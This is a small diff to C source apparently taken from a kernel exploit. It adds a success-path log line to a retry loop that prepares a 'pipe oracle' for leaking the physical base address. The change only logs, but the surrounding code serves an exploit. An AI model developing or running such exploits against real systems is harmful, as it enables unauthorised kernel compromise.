@@ -1083,6 +1083,11 @@ static int slide_leak_physical_base(void) {
   for (int pipe_try = 1; pipe_try <= pipe_oracle_attempts; pipe_try++) {
     if (prepare_p0_pipe_oracle()) {
       pipe_oracle_ok = 1;
+      /* Log on the success path too, so a run's log unambiguously shows which
+       * artifact is deployed: pre-retry builds never emit "stage-1 try=N/N
+       * ok", only the retry-enabled build does. */
+      pr_info("p0 pipe oracle stage-1 try=%d/%d ok base=%016zx\n",
+              pipe_try, pipe_oracle_attempts, pipebuf_page_base);
       break;
     }
     pr_warning("p0 pipe oracle stage-1 try=%d/%d failed\n",
